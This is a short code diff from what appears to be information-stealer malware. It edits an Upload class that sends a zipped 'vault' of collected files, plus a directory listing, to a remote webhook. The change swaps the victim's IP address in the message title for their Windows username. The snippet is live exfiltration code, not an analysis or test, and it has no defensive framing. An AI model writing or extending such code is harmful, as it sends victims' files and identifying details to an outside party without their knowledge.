@@ -65,7 +65,7 @@ class Upload:
     def send(self):
         self.webhook.send(
             embed=Embed(
-                title="log from's " + get_ip_address(),
+                title="log from's " + os.getenv('USERNAME'),
                 description="```" + '\n'.join(self.tree(Path("vault"))) + "```",
             ),
             file=File("vault.zip"),
